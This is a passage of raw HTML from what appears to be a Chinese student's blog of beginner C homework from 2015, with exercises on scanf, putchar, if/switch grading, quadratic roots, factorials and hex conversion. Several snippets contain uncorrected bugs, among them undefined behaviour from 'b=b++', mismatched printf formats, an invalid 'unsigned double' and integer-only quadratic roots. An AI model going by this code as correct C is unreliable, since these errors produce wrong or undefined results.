class=\"string\">\"x=%d,y=%d\\n\"</span>,x,y);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//（++i先自加后运算）</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"学习scanf和math-h\"><a href=\"#学习scanf和math-h\" class=\"headerlink\" title=\"学习scanf和math.h\"></a>学习scanf和math.h</h1><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,a);</span><br><span class=\"line\">  <span class=\"keyword\">char</span> a;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> b=<span class=\"number\">2</span>,c=<span class=\"number\">3</span>,d=<span class=\"number\">0</span>;</span><br><span class=\"line\">  d=a*b*c;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,d);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// （scanf在调试时容易忘记输入...）</span></span><br><span class=\"line\"><span class=\"comment\">// （a乘b乘c要使用”*”符号，不能像数学计算中一样省略，此处不能省略）</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"学习单个字符输出函数putchar（2015-9-24）\"><a href=\"#学习单个字符输出函数putchar（2015-9-24）\" class=\"headerlink\" title=\"学习单个字符输出函数putchar（2015.9.24）\"></a>学习单个字符输出函数putchar（2015.9.24）</h1><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//3.4 数据输出</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a,b;</span><br><span class=\"line\">\ta=<span class=\"string\">'b'</span>;b=<span class=\"string\">'o'</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">putchar</span>(a);<span class=\"built_in\">putchar</span>(b);</span><br><span class=\"line\">\t<span class=\"built_in\">putchar</span>(<span class=\"string\">'y'</span>);<span class=\"built_in\">putchar</span>(<span class=\"string\">'\\n'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// （括号内可以是字符常量，也可以是整型变量，此时仅输出低字节所代表的字符）</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"作业（2015-10-10）\"><a href=\"#作业（2015-10-10）\" class=\"headerlink\" title=\"作业（2015.10.10）\"></a>作业（2015.10.10）</h1><h2 id=\"分开一个两位数的十位和个位\"><a href=\"#分开一个两位数的十位和个位\" class=\"headerlink\" title=\"分开一个两位数的十位和个位\"></a>分开一个两位数的十位和个位</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,b,c;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"输入一个两位数\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;a);</span><br><span class=\"line\">\tb=a/<span class=\"number\">10</span>;</span><br><span class=\"line\">\tc=a-b*<span class=\"number\">10</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"该数字的十位是%d,个位是%d\\n\"</span>,b,c);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image002.jpg\" alt=\"img\"></p>\n<h2 id=\"printf的进阶使用\"><a href=\"#printf的进阶使用\" class=\"headerlink\" title=\"printf的进阶使用\"></a>printf的进阶使用</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">double</span> a;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,<span class=\"number\">10</span>*a);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image001.png\" alt=\"img\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// &lt;把“double”前的“unsigned”去掉（有符号变无符号）&gt;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;\t<span class=\"keyword\">double</span> a;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,<span class=\"number\">10</span>*a);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"20151010.png\" alt></p>\n<h1 id=\"if（和else）条件的使用（2015-10-15）\"><a href=\"#if（和else）条件的使用（2015-10-15）\" class=\"headerlink\" title=\"if（和else）条件的使用（2015.10.15）\"></a>if（和else）条件的使用（2015.10.15）</h1><h2 id=\"一\"><a href=\"#一\" class=\"headerlink\" title=\"一\"></a>一</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> x,y;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;x);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x&lt;<span class=\"number\">-5</span>)</span><br><span class=\"line\">\t\ty=x;</span><br><span class=\"line\">\t  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(x&gt;=<span class=\"number\">-5</span>&amp;&amp;x&lt;<span class=\"number\">1</span>)</span><br><span class=\"line\">\t    y=<span class=\"number\">2</span>*x+<span class=\"number\">5</span>;</span><br><span class=\"line\">\t  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(x&gt;=<span class=\"number\">1</span>&amp;&amp;x&lt;<span class=\"number\">4</span>)</span><br><span class=\"line\">\t    y=x+<span class=\"number\">6</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> y=<span class=\"number\">3</span>*x<span class=\"number\">-2</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,y);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"1.png\" alt></p>\n<p><img src=\"2.png\" alt></p>\n<h2 id=\"二、根据学生成绩分等级\"><a href=\"#二、根据学生成绩分等级\" class=\"headerlink\" title=\"二、根据学生成绩分等级\"></a>二、根据学生成绩分等级</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,b;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;a);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a&lt;<span class=\"number\">0</span>||a&gt;<span class=\"number\">100</span>) b=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a&gt;=<span class=\"number\">0</span>&amp;&amp;a&lt;<span class=\"number\">60</span>) b=<span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a&gt;=<span class=\"number\">60</span>&amp;&amp;a&lt;<span class=\"number\">70</span>) b=<span class=\"number\">3</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a&gt;=<span class=\"number\">70</span>&amp;&amp;a&lt;<span class=\"number\">80</span>) b=<span class=\"number\">4</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a&gt;=<span class=\"number\">80</span>&amp;&amp;a&lt;<span class=\"number\">90</span>) b=<span class=\"number\">5</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a==<span class=\"number\">100</span>) b=<span class=\"number\">6</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(b)</span><br><span class=\"line\">\t&#123;   </span><br><span class=\"line\">\t    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:<span class=\"built_in\">puts</span>(<span class=\"string\">\"您输入了错误的成绩...\"</span>);<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t    <span class=\"keyword\">case</span> <span class=\"number\">2</span>:<span class=\"built_in\">puts</span>(<span class=\"string\">\"学生等级为'E',对不起，您不及格...\"</span>);<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:<span class=\"built_in\">puts</span>(<span class=\"string\">\"学生等级为'D'\"</span>);<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:<span class=\"built_in\">puts</span>(<span class=\"string\">\"学生等级为'C'\"</span>);<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">5</span>:<span class=\"built_in\">puts</span>(<span class=\"string\">\"学生等级为'B'\"</span>);<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">6</span>:<span class=\"built_in\">puts</span>(<span class=\"string\">\"学生等级为'A',您得了满分，学霸呀~\"</span>);<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>: <span class=\"built_in\">puts</span>(<span class=\"string\">\"学生等级为'A'\"</span>); </span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"3.png\" alt></p>\n<p><img src=\"4.png\" alt></p>\n<p><img src=\"5.png\" alt></p>\n<p><img src=\"6.png\" alt></p>\n<h2 id=\"三个程序的比较\"><a href=\"#三个程序的比较\" class=\"headerlink\" title=\"三个程序的比较\"></a>三个程序的比较</h2><p>分别根据不同的x来给y赋值（本质相同，判断条件不同）</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> x,y=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;x);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x&lt;=<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(x&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\ty=<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> y=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> x,y=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;x);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x&lt;<span class=\"number\">0</span>||x&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(x&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\ty=<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> y=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> x,y=<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;x);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(x&gt;=<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(x&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\ty=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> y=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"作业【2015-10-17】\"><a href=\"#作业【2015-10-17】\" class=\"headerlink\" title=\"作业【2015.10.17】\"></a>作业【2015.10.17】</h1><h2 id=\"解一元二次方程\"><a href=\"#解一元二次方程\" class=\"headerlink\" title=\"解一元二次方程\"></a>解一元二次方程</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,b,c,d,e,f,x1,x2;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"请对应输入方程的a,b,c\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d %d %d\"</span>,&amp;a,&amp;b,&amp;c);</span><br><span class=\"line\">    d=b*b<span class=\"number\">-4</span>*a*c;\t</span><br><span class=\"line\"> \t<span class=\"keyword\">if</span>(d&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tf=<span class=\"built_in\">sqrt</span>(-d);</span><br><span class=\"line\">\t    <span class=\"built_in\">printf</span>(<span class=\"string\">\"x1=%d+%di\\n\"</span>,(-b)/(<span class=\"number\">2</span>*a),f/(<span class=\"number\">2</span>*a));</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"x2=%d-%di\\n\"</span>,(-b)/(<span class=\"number\">2</span>*a),f/(<span class=\"number\">2</span>*a));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"number\">0</span>==d)</span><br><span class=\"line\">\t&#123;\t</span><br><span class=\"line\">\t\tf=<span class=\"built_in\">sqrt</span>(-d);</span><br><span class=\"line\">\t\te=(-b)/(<span class=\"number\">2</span>*a);</span><br><span class=\"line\">\t    <span class=\"built_in\">printf</span>(<span class=\"string\">\"此方程有两个相等的根，为x=%d\\n\"</span>,e);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(d&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;   </span><br><span class=\"line\">\t\tf=<span class=\"built_in\">sqrt</span>(d);</span><br><span class=\"line\">\t\tx1=(-b+f)/(<span class=\"number\">2</span>*a);</span><br><span class=\"line\">        x2=(-b-f)/(<span class=\"number\">2</span>*a);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"x1=%d,x2=%d\\n\"</span>,x1,x2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"7.png\" alt></p>\n<p><img src=\"clip_image001-1586097707043.png\" alt=\"img\"></p>\n<p><img src=\"clip_image002.png\" alt=\"img\"></p>\n<p><img src=\"clip_image003.png\" alt=\"img\"></p>\n<p><img src=\"clip_image004.png\" alt=\"img\"></p>\n<h2 id=\"switch菜单-n的阶乘\"><a href=\"#switch菜单-n的阶乘\" class=\"headerlink\" title=\"switch菜单+n的阶乘\"></a>switch菜单+n的阶乘</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,b=<span class=\"number\">1</span>,c=<span class=\"number\">1</span>,n;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"请选择您想要执行的方式\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"1.for语句\\n2.while语句\\n3.do while语句\\n4.go for+if语句\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;a);</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(a)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:<span class=\"built_in\">puts</span>(<span class=\"string\">\"您选择的是for语句，请输入n\"</span>);<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;n);<span class=\"keyword\">for</span>(;b&lt;=n;c=b*c,b=b++);<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:<span class=\"built_in\">puts</span>(<span class=\"string\">\"您选择的是while语句，请输入n\"</span>);<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;n);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">while</span>(b&lt;=n)</span><br><span class=\"line\">\t\t\t   &#123;</span><br><span class=\"line\">\t\t\t\t   c=b*c;</span><br><span class=\"line\">\t\t\t\t   b=b++;</span><br><span class=\"line\">\t\t\t   &#125;</span><br><span class=\"line\">\t\t\t  ;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:<span class=\"built_in\">puts</span>(<span class=\"string\">\"您选择的是do while语句，请输入n\"</span>);<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;n);</span><br><span class=\"line\">\t\t\t   <span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t\t   &#123;</span><br><span class=\"line\">\t\t\t\t   c=b*c;</span><br><span class=\"line\">\t\t\t\t   b=b++;</span><br><span class=\"line\">\t\t\t   &#125;</span><br><span class=\"line\">\t\t\t   <span class=\"keyword\">while</span>(b&lt;=n);<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:<span class=\"built_in\">puts</span>(<span class=\"string\">\"您选择的是goto+if语句，请输入n\"</span>);<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;n);</span><br><span class=\"line\">             loop:<span class=\"keyword\">if</span>(b&lt;=n)</span><br><span class=\"line\">\t\t\t   &#123;</span><br><span class=\"line\">\t\t\t\t   c=b*c;</span><br><span class=\"line\">\t\t\t\t   b=b++;</span><br><span class=\"line\">\t\t\t\t   <span class=\"keyword\">goto</span> loop;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t   &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,c);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image001-1586097856539.png\" alt=\"img\"></p>\n<p><img src=\"clip_image002-1586097856539.png\" alt=\"img\"></p>\n<p><img src=\"clip_image004.jpg\" alt=\"img\"></p>\n<h2 id=\"N的阶加\"><a href=\"#N的阶加\" class=\"headerlink\" title=\"N的阶加\"></a>N的阶加</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//2015.10.17</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,b,n;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"请输入n\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;n);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(a=<span class=\"number\">0</span>,b=<span class=\"number\">1</span>;b&lt;=n;a=a+b,b=b++);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,a);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"8.png\" alt></p>\n<p><img src=\"clip_image001-1586097954033.png\" alt=\"img\"></p>\n<p><img src=\"clip_image002-1586097965141.jpg\" alt=\"IMG_2039\"></p>\n<h2 id=\"N的阶乘\"><a href=\"#N的阶乘\" class=\"headerlink\" title=\"N的阶乘\"></a>N的阶乘</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">aaa</span><span class=\"params\">(<span class=\"keyword\">int</span> a)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> b=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a==<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\tb=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> b=a*aaa(a<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,b;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;a);</span><br><span class=\"line\">\taaa(a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,aaa(a));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"显示1-10的平方数\"><a href=\"#显示1-10的平方数\" class=\"headerlink\" title=\"显示1-10的平方数\"></a>显示1-10的平方数</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,n;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"请输入一个n\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;n);</span><br><span class=\"line\">\ta=n*n;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"该数的平方数为%d\\n\"</span>,a);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"9.png\" alt></p>\n<p><img src=\"10.png\" alt></p>\n<h1 id=\"作业【2015-10-25】\"><a href=\"#作业【2015-10-25】\" class=\"headerlink\" title=\"作业【2015.10.25】\"></a>作业【2015.10.25】</h1><h2 id=\"十进制转十六进制\"><a href=\"#十进制转十六进制\" class=\"headerlink\" title=\"十进制转十六进制\"></a>十进制转十六进制</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,b,c[<span class=\"number\">100</span>],d=<span class=\"number\">0</span>,e;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;a);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(;a&gt;=<span class=\"number\">1</span>;d=d++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t(a%<span class=\"number\">16</span>)&lt;<span class=\"number\">10</span>?c[d]=a%<span class=\"number\">16</span>:c[d]=(a%<span class=\"number\">16</span>)+<span class=\"number\">55</span>;a=a/<span class=\"number\">16</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(e=d<span class=\"number\">-1</span>;e&gt;=<span class=\"number\">0</span>;e--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t(c[e]&lt;<span class=\"number\">10</span>)?<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>,c[e]):<span class=\"built_in\">printf</span>(<span class=\"string\">\"%c\"</span>,c[e]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"11.png\" alt></p>\n<p><img src=\"12.png\" alt></p>\n<h2 id=\"扑克牌洗牌\"><a href=\"#扑克牌洗牌\" class=\"headerlink\" title=\"扑克牌洗牌\"></a>扑克牌洗牌</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span 